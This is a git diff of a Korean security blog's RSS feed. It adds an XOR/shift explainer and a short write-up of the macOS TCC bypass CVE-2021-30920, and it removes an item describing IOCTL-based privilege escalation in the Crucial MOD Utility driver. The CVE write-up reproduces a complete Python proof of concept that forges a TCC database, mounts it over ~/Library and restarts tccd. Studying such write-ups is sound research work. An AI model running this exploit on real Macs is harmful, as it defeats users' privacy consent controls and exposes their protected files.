@@ -9,8 +9,72 @@
     <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>hack &amp; life</description>
-    <pubDate>Sun, 31 Oct 2021 09:35:06 GMT</pubDate>
+    <pubDate>Wed, 03 Nov 2021 05:40:03 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>[해키피디아] XOR(Exclusive OR), shift 연산</title>
+      <link>https://hackyboiz.github.io/2021/11/03/y00n_nms/xor/</link>
+      <guid>https://hackyboiz.github.io/2021/11/03/y00n_nms/xor/</guid>
+      <pubDate>Wed, 03 Nov 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;p&gt;&lt;strong&gt;XOR(Exclusice OR, &amp;#xBC30;&amp;#xD0C0;&amp;#xC801; &amp;#xB17C;&amp;#xB9AC;&amp;#xD569;)&amp;#xC5F0;&amp;#xC0B0;&lt;/strong&gt;&amp;#xC744; &amp;#xBCA4;&amp;#xB2E4;&amp;#xC774;&amp;#x</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<p><strong>XOR(Exclusice OR, &#xBC30;&#xD0C0;&#xC801; &#xB17C;&#xB9AC;&#xD569;)&#xC5F0;&#xC0B0;</strong>&#xC744; &#xBCA4;&#xB2E4;&#xC774;&#xC5B4;&#xADF8;&#xB7A8;&#xC73C;&#xB85C; &#xB098;&#xD0C0;&#xB0B4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC73C;&#xBA70;, XOR, xor, ^, $\oplus$ &#xB85C; &#xD45C;&#xC2DC;&#xB429;&#xB2C8;&#xB2E4;. &#xBE44;&#xD2B8;&#xAC04;&#xC758; &#xBC30;&#xD0C0;&#xC801; &#xB17C;&#xB9AC;&#xD569; &#xC5F0;&#xC0B0;&#xC740; &#xB450; &#xAC1C;&#xC758; &#xBE44;&#xD2B8; &#xC911; &#xD558;&#xB098;&#xB9CC; 1&#xC77C;&#xB54C; 1&#xC758; &#xACB0;&#xACFC;&#xAC00; &#xB098;&#xC624;&#xBA70;, &#xC774;&#xB294; &#xB450; &#xC218;&#xB97C; &#xB354;&#xD574; 2&#xB85C; &#xB098;&#xB204;&#xB294; &#xB098;&#xBA38;&#xC9C0;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. ($mod\space 2$)</p><p><img src="/Users/y00n/hackyboiz/github-page/blog/source/_posts/y00n_nms/xor/image.png" alt="image"></p><p>&#xAC19;&#xC740; &#xBE44;&#xD2B8;&#xB85C; &#xC5F0;&#xC0B0;&#xD558;&#xBA74; 0&#xC774; &#xB418;&#xB294; &#xC810;($A\oplus A = 0$)&#xC744; &#xC774;&#xC6A9;&#xD574; $A \oplus (B\oplus B) = A$&#xB85C; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xC774;&#xB7EC;&#xD55C; &#xD2B9;&#xC9D5;&#xC73C;&#xB85C; One Time Pad&#xC5D0;&#xC11C; &#xC554;&#xD638;&#xD654;&#xC640; &#xBCF5;&#xD638;&#xD654;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><script type="math/tex; mode=display">P = C \oplus K = (P \oplus K) \oplus K = P \oplus (K \oplus K) = P</script><p><strong>Shift &#xC5F0;&#xC0B0;</strong>&#xC740; &#xBE44;&#xD2B8;&#xB97C; &#xC624;&#xB978;&#xCABD;(<code>&gt;&gt;</code>), &#xB610;&#xB294; &#xC67C;&#xCABD;(<code>&lt;&lt;</code>)&#xC73C;&#xB85C; &#xC62E;&#xAE30;&#xB294; &#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>&#xBCC0;&#xC218;</code> <code>&lt;&lt;</code> <code>&#xC774;&#xB3D9;&#xD560; &#xBE44;&#xD2B8; &#xC218;</code>&#xC758; &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xC608;&#xB97C; &#xB4E4;&#xC5B4; <code>&lt;&lt; 1</code>&#xC740; &#xC67C;&#xCABD;&#xC73C;&#xB85C; 1&#xAC1C;&#xC529; &#xBAA8;&#xB450; &#xC62E;&#xAE30;&#xBA70; &#xB0A8;&#xC740; &#xBE44;&#xD2B8;&#xC5D0;&#xB294; 0&#xC744; &#xCC44;&#xC6C1;&#xB2C8;&#xB2E4;.</p><p><img src="/Users/y00n/hackyboiz/github-page/blog/source/_posts/y00n_nms/xor/image1.png" alt="image1"></p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/otp/">otp</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/y00n-nms/">y00n_nms</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/xor/">xor</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/11/03/y00n_nms/xor/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] CVE-2021-30920 - CVE-2021-1784 strikes back - TCC bypass via mounting</title>
+      <link>https://hackyboiz.github.io/2021/11/02/fabu1ous/2021-11-02/</link>
+      <guid>https://hackyboiz.github.io/2021/11/02/fabu1ous/2021-11-02/</guid>
+      <pubDate>Tue, 02 Nov 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://theevilbit.github.io/posts/cve_2021_30920/&quot;&gt;CVE-2</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://theevilbit.github.io/posts/cve_2021_30920/">CVE-2021-30920 - CVE-2021-1784 strikes back - TCC bypass via mounting</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>macOS Monterey beta</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Transparency, Consent, and Control (TCC) &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB294; &#xC124;&#xCE58;&#xB41C; &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xD5C8;&#xAC00; &#xC5C6;&#xC774; &#xBBFC;&#xAC10;&#xD55C; &#xC0AC;&#xC6A9;&#xC790; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xAC70;&#xBD80;&#xD558;&#xB294; Apple&#xC758; subsystem&#xC785;&#xB2C8;&#xB2E4;.</p><p>CVE-2021-1784 &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC545;&#xC131; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; <code>~/Library</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xC0C8;&#xB85C;&#xC6B4; TCC database&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; user level TCC&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xACE0; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; macOS Big Sur&#xC5D0;&#xC11C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC; macOS Monterey beta &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xB2E4;&#xC2DC; &#xBC1C;&#xACAC; &#xB418;&#xC5B4; CVE-2021-30920&#xB77C;&#xB294; &#xBC88;&#xD638;&#xAC00; &#xBC1C;&#xAE09;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>User level TCC&#xB294; Finder.app&#xC5D0; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xC791;&#xC131; &#xBC0F; &#xC2E4;&#xD589;&#xC744; &#xD5C8;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. Finder.app&#xC740; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xB300;&#xD55C; full access &#xAD8C;&#xD55C;&#xC744; &#xAC16;&#xACE0; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC545;&#xC131; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC73C;&#xB85C; full disk access&#xB97C; &#xD68D;&#xB4DD; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p>&#xC0C8;&#xB85C;&#xC6B4; TCC.db &#xC0DD;&#xC131; (<code>/tmp/TCC.db</code>)</p></li><li><p>&#xC0C8;&#xB85C;&#xC6B4; DMG &#xD30C;&#xC77C; &#xC0DD;&#xC131; (<code>/tmp/tmp.dmg</code>)</p></li><li><p><code>~/Library</code>&#xC5D0; DMG &#xD30C;&#xC77C; &#xB9C8;&#xC6B4;&#xD2B8;</p><pre><code class="hljs bash">hdiutil attach -owners off -mountpoint Library tmp.dmg</code></pre></li><li><p><code>tccd</code> &#xB370;&#xBAAC; &#xC7AC;&#xC2DC;&#xC791;</p></li></ol><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB204;&#xAD6C;&#xB098; <code>~/Library</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; DMG &#xD30C;&#xC77C;&#xC744; &#xB9C8;&#xC6B4;&#xD2B8;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> ostcc_dump = <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">PRAGMA foreign_keys=OFF;</span><span class="hljs-string">BEGIN TRANSACTION;</span><span class="hljs-string">CREATE TABLE admin (key TEXT PRIMARY KEY NOT NULL, value INTEGER NOT NULL);</span><span class="hljs-string">INSERT INTO admin VALUES(&apos;version&apos;,20);</span><span class="hljs-string">CREATE TABLE policies (    id        INTEGER    NOT NULL PRIMARY KEY,     bundle_id    TEXT    NOT NULL,     uuid        TEXT    NOT NULL,     display        TEXT    NOT NULL,     UNIQUE (bundle_id, uuid));</span><span class="hljs-string">CREATE TABLE active_policy (    client        TEXT    NOT NULL,     client_type    INTEGER    NOT NULL,     policy_id    INTEGER NOT NULL,     PRIMARY KEY (client, client_type),     FOREIGN KEY (policy_id) REFERENCES policies(id) ON DELETE CASCADE ON UPDATE CASCADE);</span><span class="hljs-string">CREATE TABLE access (    service        TEXT        NOT NULL,     client         TEXT        NOT NULL,     client_type    INTEGER     NOT NULL,     auth_value     INTEGER     NOT NULL,     auth_reason    INTEGER     NOT NULL,     auth_version   INTEGER     NOT NULL,     csreq          BLOB,     policy_id      INTEGER,     indirect_object_identifier_type    INTEGER,     indirect_object_identifier         TEXT NOT NULL DEFAULT &apos;UNUSED&apos;,     indirect_object_code_identity      BLOB,     flags          INTEGER,     last_modified  INTEGER     NOT NULL DEFAULT (CAST(strftime(&apos;%s&apos;,&apos;now&apos;) AS INTEGER)),     PRIMARY KEY (service, client, client_type, indirect_object_identifier),    FOREIGN KEY (policy_id) REFERENCES policies(id) ON DELETE CASCADE ON UPDATE CASCADE);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceLiverpool&apos;,&apos;com.apple.willowd&apos;,0,2,4,1,NULL,NULL,0,&apos;UNUSED&apos;,NULL,0,1623184393);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceLiverpool&apos;,&apos;com.apple.shortcuts&apos;,0,2,4,1,NULL,NULL,0,&apos;UNUSED&apos;,NULL,0,1623184393);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceUbiquity&apos;,&apos;com.apple.shortcuts&apos;,0,2,5,1,NULL,NULL,NULL,&apos;UNUSED&apos;,NULL,0,1623184394);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceLiverpool&apos;,&apos;com.apple.remindd&apos;,0,2,4,1,NULL,NULL,0,&apos;UNUSED&apos;,NULL,0,1623184395);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceLiverpool&apos;,&apos;com.apple.textinput.KeyboardServices&apos;,0,2,4,1,NULL,NULL,0,&apos;UNUSED&apos;,NULL,0,1623184395);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceLiverpool&apos;,&apos;com.apple.appleaccountd&apos;,0,2,4,1,NULL,NULL,0,&apos;UNUSED&apos;,NULL,0,1623184395);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceLiverpool&apos;,&apos;com.apple.Safari&apos;,0,2,4,1,NULL,NULL,0,&apos;UNUSED&apos;,NULL,0,1623184396);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceLiverpool&apos;,&apos;com.apple.syncdefaultsd&apos;,0,2,4,1,NULL,NULL,0,&apos;UNUSED&apos;,NULL,0,1623184396);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceLiverpool&apos;,&apos;com.apple.suggestd&apos;,0,2,4,1,NULL,NULL,0,&apos;UNUSED&apos;,NULL,0,1623184396);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceLiverpool&apos;,&apos;com.apple.siriknowledged&apos;,0,2,4,1,NULL,NULL,0,&apos;UNUSED&apos;,NULL,0,1623184396);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceLiverpool&apos;,&apos;com.apple.securityd&apos;,0,2,4,1,NULL,NULL,0,&apos;UNUSED&apos;,NULL,0,1623184396);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceLiverpool&apos;,&apos;com.apple.protectedcloudstorage.protectedcloudkeysyncing&apos;,0,2,4,1,NULL,NULL,0,&apos;UNUSED&apos;,NULL,0,1623184396);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceLiverpool&apos;,&apos;com.apple.knowledge-agent&apos;,0,2,4,1,NULL,NULL,0,&apos;UNUSED&apos;,NULL,0,1623184396);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceLiverpool&apos;,&apos;com.apple.imagent&apos;,0,2,4,1,NULL,NULL,0,&apos;UNUSED&apos;,NULL,0,1623184397);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceLiverpool&apos;,&apos;com.apple.identityservicesd&apos;,0,2,4,1,NULL,NULL,0,&apos;UNUSED&apos;,NULL,0,1623184397);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceLiverpool&apos;,&apos;com.apple.icloud.fmfd&apos;,0,2,4,1,NULL,NULL,0,&apos;UNUSED&apos;,NULL,0,1623184397);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceLiverpool&apos;,&apos;com.apple.donotdisturbd&apos;,0,2,4,1,NULL,NULL,0,&apos;UNUSED&apos;,NULL,0,1623184397);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceLiverpool&apos;,&apos;com.apple.cloudpaird&apos;,0,2,4,1,NULL,NULL,0,&apos;UNUSED&apos;,NULL,0,1623184397);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceLiverpool&apos;,&apos;com.apple.assistant.assistantd&apos;,0,2,4,1,NULL,NULL,0,&apos;UNUSED&apos;,NULL,0,1623184397);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceLiverpool&apos;,&apos;com.apple.StatusKitAgent&apos;,0,2,4,1,NULL,NULL,0,&apos;UNUSED&apos;,NULL,0,1623184397);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceUbiquity&apos;,&apos;/System/Library/PrivateFrameworks/PhotoLibraryServices.framework/Versions/A/Support/photolibraryd&apos;,1,2,5,1,NULL,NULL,NULL,&apos;UNUSED&apos;,NULL,0,1623184413);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceLiverpool&apos;,&apos;com.apple.amsengagementd&apos;,0,2,4,1,NULL,NULL,0,&apos;UNUSED&apos;,NULL,0,1623184458);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceSystemPolicyDownloadsFolder&apos;,&apos;com.apple.Terminal&apos;,0,2,2,1,X&apos;fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003&apos;,NULL,NULL,&apos;UNUSED&apos;,NULL,0,1623239871);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceSystemPolicyDocumentsFolder&apos;,&apos;com.apple.Terminal&apos;,0,2,2,1,X&apos;fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003&apos;,NULL,NULL,&apos;UNUSED&apos;,NULL,0,1623239880);</span><span class="hljs-string">INSERT INTO access VALUES(&apos;kTCCServiceSystemPolicyDesktopFolder&apos;,&apos;com.apple.Terminal&apos;,0,2,2,1,X&apos;fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003&apos;,NULL,NULL,&apos;UNUSED&apos;,NULL,0,1623239885);</span><span class="hljs-string">CREATE TABLE access_overrides (    service        TEXT    NOT NULL PRIMARY KEY);</span><span class="hljs-string">CREATE TABLE expired (    service        TEXT        NOT NULL,     client         TEXT        NOT NULL,     client_type    INTEGER     NOT NULL,     csreq          BLOB,     last_modified  INTEGER     NOT NULL ,     expired_at     INTEGER     NOT NULL DEFAULT (CAST(strftime(&apos;%s&apos;,&apos;now&apos;) AS INTEGER)),     PRIMARY KEY (service, client, client_type));</span><span class="hljs-string">CREATE INDEX active_policy_id ON active_policy(policy_id);</span><span class="hljs-string">COMMIT;</span><span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_tcc_db</span>():</span>f = open(<span class="hljs-string">&apos;/tmp/tccdump.sql&apos;</span>,<span class="hljs-string">&apos;w&apos;</span>)f.write(tcc_dump)f.close()os.system(<span class="hljs-string">&quot;sqlite3 /tmp/TCC.db &lt; /tmp/tccdump.sql&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_dmg</span>():</span>os.system(<span class="hljs-string">&quot;hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \\&quot;</span>tccbypass\\<span class="hljs-string">&quot; -fs APFS 1&gt;/dev/null&quot;</span>)os.system(<span class="hljs-string">&quot;mkdir /tmp/mnt&quot;</span>)os.system(<span class="hljs-string">&quot;hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1&gt;/dev/null&quot;</span>)os.system(<span class="hljs-string">&quot;mkdir -p /tmp/mnt/Application\\ Support/com.apple.TCC/&quot;</span>)os.system(<span class="hljs-string">&quot;cp /tmp/TCC.db /tmp/mnt/Application\\ Support/com.apple.TCC/TCC.db&quot;</span>)os.system(<span class="hljs-string">&quot;hdiutil detach /tmp/mnt 1&gt;/dev/null&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mount_trick</span>():</span>os.system(<span class="hljs-string">&quot;hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg 1&gt;/dev/null&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">restart_tcc</span>():</span>os.system(<span class="hljs-string">&quot;launchctl stop com.apple.tccd &amp;&amp; launchctl start com.apple.tccd&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>print(<span class="hljs-string">&quot;[i] Creating new TCC database&quot;</span>)create_tcc_db()print(<span class="hljs-string">&quot;[i] Creating and prepare DMG file&quot;</span>)create_dmg()print(<span class="hljs-string">&quot;[i] Mount DMG over Library&quot;</span>)mount_trick()print(<span class="hljs-string">&quot;[i] Restart TCC&quot;</span>)restart_tcc()print(<span class="hljs-string">&quot;[i] Enjoy access :-)&quot;</span>)main()</code></pre>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/finder/">finder</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/macos/">macos</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/tcc/">tcc</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/11/02/fabu1ous/2021-11-02/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>[Daily-Life] TeamH4C 학생용 해킹노트 컨퍼런스 후기</title>
@@ -132,11 +196,11 @@
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
       
       
-      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
-      
       <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
       
       <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
       
       <category domain="https://hackyboiz.github.io/tags/dbase/">dbase</category>
       
@@ -206,9 +270,9 @@
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
       
       
-      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
-      
       <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
       
       <category domain="https://hackyboiz.github.io/tags/spoofing/">spoofing</category>
       
@@ -240,11 +304,11 @@
       <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
       
       
-      <category domain="https://hackyboiz.github.io/tags/fuzzing/">fuzzing</category>
-      
       <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
       
       <category domain="https://hackyboiz.github.io/tags/fuzzer/">fuzzer</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/fuzzing/">fuzzing</category>
       
       <category domain="https://hackyboiz.github.io/tags/servey/">servey</category>
       
@@ -306,15 +370,15 @@
       
       <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
       
-      <category domain="https://hackyboiz.github.io/tags/apple/">apple</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
-      
       <category domain="https://hackyboiz.github.io/tags/ios/">ios</category>
       
       <category domain="https://hackyboiz.github.io/tags/use-after-free/">use after free</category>
       
       <category domain="https://hackyboiz.github.io/tags/webkit/">webkit</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/apple/">apple</category>
       
       <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
       
@@ -408,15 +472,15 @@
       <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
       
       
-      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/server/">server</category>
+      <category domain="https://hackyboiz.github.io/tags/network/">network</category>
       
       <category domain="https://hackyboiz.github.io/tags/fuzzing/">fuzzing</category>
       
-      <category domain="https://hackyboiz.github.io/tags/network/">network</category>
-      
       <category domain="https://hackyboiz.github.io/tags/winafl/">winafl</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/server/">server</category>
       
       <category domain="https://hackyboiz.github.io/tags/rdp/">rdp</category>
       
@@ -516,17 +580,17 @@
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
       
       
-      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
-      
       <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/mac/">mac</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/apple/">apple</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
       
       <category domain="https://hackyboiz.github.io/tags/driver/">driver</category>
       
       <category domain="https://hackyboiz.github.io/tags/m1/">m1</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/apple/">apple</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/mac/">mac</category>
       
       <category domain="https://hackyboiz.github.io/tags/iokit/">iokit</category>
       
@@ -635,74 +699,6 @@
       
       
       <comments>https://hackyboiz.github.io/2021/10/10/l0ch/segment-heap-part2/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] Crucial’s MOD Utility LPE – CVE-2021-41285</title>
-      <link>https://hackyboiz.github.io/2021/10/09/j0ker/2021-10-09/</link>
-      <guid>https://hackyboiz.github.io/2021/10/09/j0ker/2021-10-09/</guid>
-      <pubDate>Sat, 09 Oct 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://voidsec.com/crucial-mod-utility-lpe-cve-2021-4128</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://voidsec.com/crucial-mod-utility-lpe-cve-2021-41285/">https://voidsec.com/crucial-mod-utility-lpe-cve-2021-41285/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Crucial Ballistix MOD Utility</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Crucial Ballistix MOD Utility&#xC758; <code>MODAPI.sys</code>&#xC5D0;&#xC11C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC774; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACF5;&#xAC1C;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC740; &#xBAA8;&#xB450; IOCTL &#xC694;&#xCCAD;&#xC744; &#xD1B5;&#xD574; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>IO bus&#xC5D0; &#xB370;&#xC774;&#xD130; &#xB370;&#xC774;&#xD130; &#xC4F0;&#xAE30; &#xD639;&#xC740; &#xC77D;&#xC5B4;&#xC624;&#xAE30;<ul><li><code>0x9C406144: HalGetBusDataByOffset</code></li><li><code>0x9C40A148: HalSetBusDataByOffset</code></li><li>IO bus&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC368;&#xC11C; PCI &#xC124;&#xC815; &#xC815;&#xBCF4; &#xD639;&#xC740; &#xBCA4;&#xB354;&#xC758; &#xB370;&#xC774;&#xD130; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB4E4;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li>IO port&#xC5D0;&#xC11C; 1/2/4 &#xBC14;&#xC774;&#xD2B8; &#xC77D;&#xAE30; &#xD639;&#xC740; &#xC4F0;&#xAE30;<ul><li><code>0x9C40A0C8, 0x9C40A0D8 __outbyte, 0x9C40A0DC __outword, 0x9C40A0E0 __outdword</code></li><li><code>0x9C4060C4, 0x9C4060CC __inbyte, 0x9C4060D0 __inword, 0x9C4060D4 __indword</code></li><li>HDD&#xC640; GPU &#xB4F1; &#xB514;&#xBC14;&#xC774;&#xC2A4;&#xB4E4;&#xACFC; &#xC9C1;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xD1B5;&#xC2E0;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xC9C1;&#xC811; &#xC4F0;&#xACE0; &#xC77D;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li>&#xC784;&#xC758; &#xBB3C;&#xB9AC;&#xC8FC;&#xC18C; &#xD560;&#xB2F9; &#xBC0F; &#xC720;&#xC800; &#xACF5;&#xAC04;&#xACFC; &#xB9E4;&#xD551;<ul><li><code>0x9C406104: MmMapIoSpace</code></li><li>&#xB7A8;&#xC5D0; &#xC788;&#xB294; &#xBB3C;&#xB9AC;&#xC8FC;&#xC18C;&#xB97C; &#xC720;&#xC800; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBA54;&#xBAA8;&#xB9AC;&#xB85C; &#xB9E4;&#xD551;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xBC14;&#xB85C; &#xC815;&#xBCF4;&#xB97C; &#xCD94;&#xCD9C;&#xD560; &#xC218; 